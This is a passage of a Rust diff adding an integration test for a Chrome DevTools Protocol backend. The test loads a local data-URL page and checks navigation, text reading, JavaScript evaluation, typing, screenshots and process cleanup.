+            .expect("Failed to spawn Chrome");
+
+        // Wait for the CDP endpoint to be ready.
+        let targets_url = format!("http://127.0.0.1:{port}/json");
+        let mut ready = false;
+        for _ in 0..50 {
+            if reqwest::get(&targets_url)
+                .await
+                .map(|r| r.status().is_success())
+                .unwrap_or(false)
+            {
+                ready = true;
+                break;
+            }
+            tokio::time::sleep(Duration::from_millis(200)).await;
+        }
+        assert!(ready, "CDP endpoint not ready within 10s");
+
+        // Connect via CdpBackend.
+        let backend = CdpBackend::connect(port)
+            .await
+            .expect("CdpBackend::connect failed");
+
+        // Navigate to a data URL (no network needed).
+        let page = "data:text/html,<html><head><title>CDP Test Page</title></head><body><h1>Hello CDP</h1><p id='para'>Test paragraph text</p><button id='btn'>Click me</button><input id='inp' type='text' value='initial'></body></html>";
+        backend.goto(page).await.expect("goto failed");
+
+        // title
+        let title = backend.title().await.expect("title failed");
+        assert!(title.contains("CDP Test Page"), "title: {title}");
+
+        // current_url
+        let current = backend.current_url().await.expect("current_url failed");
+        assert!(current.starts_with("data:"), "url: {current}");
+
+        // read_page_text
+        let text = backend
+            .read_page_text()
+            .await
+            .expect("read_page_text failed");
+        assert!(text.contains("Hello CDP"), "page text: {text}");
+        assert!(text.contains("Test paragraph text"), "page text: {text}");
+
+        // read_selector_text
+        let para = backend
+            .read_selector_text("#para", Duration::from_secs(3))
+            .await
+            .expect("read_selector_text failed");
+        assert_eq!(para.trim(), "Test paragraph text");
+
+        // evaluate
+        let val = backend.evaluate("2 + 3").await.expect("evaluate failed");
+        assert_eq!(val, serde_json::json!(5));
+
+        // get_outer_html + extract_from_html
+        let html = backend
+            .get_outer_html()
+            .await
+            .expect("get_outer_html failed");
+        assert!(
+            html.contains("Hello CDP"),
+            "outerHTML should contain page content"
+        );
+        let extracted = extract_from_html(&html, "h1").expect("extract failed");
+        assert_eq!(extracted["count"], 1);
+        assert_eq!(extracted["items"][0]["text"], "Hello CDP");
+
+        // type_text (clear + type)
+        backend
+            .type_text("#inp", "hello world", true, Duration::from_secs(3))
+            .await
+            .expect("type_text failed");
+        let inp_val = backend
+            .evaluate("document.querySelector('#inp').value")
+            .await
+            .expect("read input value failed");
+        assert_eq!(inp_val, serde_json::json!("hello world"));
+
+        // screenshot (viewport)
+        let png = backend
+            .screenshot(None, Duration::from_secs(5))
+            .await
+            .expect("screenshot failed");
+        assert!(png.len() > 1000, "PNG too small: {} bytes", png.len());
+        assert!(
+            png.starts_with(&[0x89, 0x50, 0x4E, 0x47]),
+            "screenshot is not a PNG"
+        );
+
+        // screenshot (element)
+        let el_png = backend
+            .screenshot(Some("h1"), Duration::from_secs(5))
+            .await
+            .expect("element screenshot failed");
+        assert!(
+            el_png.len() > 100,
+            "element PNG too small: {} bytes",
+            el_png.len()
+        );
+
+        // is_alive
+        assert!(backend.is_alive().await, "backend should be alive");
+
+        // label
+        let label = backend.label();
+        assert!(
+            label.contains("CDP"),
+            "label should mention CDP, got: {label}"
+        );
+
+        // close (should NOT kill Chrome)
+        backend.close().await.expect("close failed");
+
+        // Verify Chrome is still running (CDP close doesn't kill the browser).
+        let still_up = reqwest::get(&targets_url)
+            .await
+            .map(|r| r.status().is_success())
+            .unwrap_or(false);
+        assert!(still_up, "Chrome should still be running after CDP close");
+
+        // Cleanup: kill the spawned Chrome.
+        chrome_proc.kill().await.ok();
+        chrome_proc.wait().await.ok();
     }
 }
